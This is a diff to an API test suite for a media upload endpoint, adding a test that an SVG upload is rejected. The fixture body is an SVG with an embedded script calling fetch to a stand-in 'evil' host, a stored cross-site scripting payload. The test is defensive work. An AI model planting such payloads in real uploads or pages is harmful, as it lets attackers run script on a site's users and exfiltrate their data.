@@ -64,6 +64,18 @@ describe("POST /api/media (upload)", () => {
     expect(res.status).toBe(400);
   });
 
+  it("rejects an SVG upload — it would execute script on the app origin", async () => {
+    const { app } = makeApp();
+    const res = await app.request("/api/media?sessionId=s1", {
+      method: "POST",
+      headers: { "content-type": "image/svg+xml" },
+      body: new TextEncoder().encode(
+        `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil')</script></svg>`,
+      ),
+    });
+    expect(res.status).toBe(400);
+  });
+
   it("rejects an empty body", async () => {
     const { app } = makeApp();
     const res = await app.request("/api/media?sessionId=s1", {
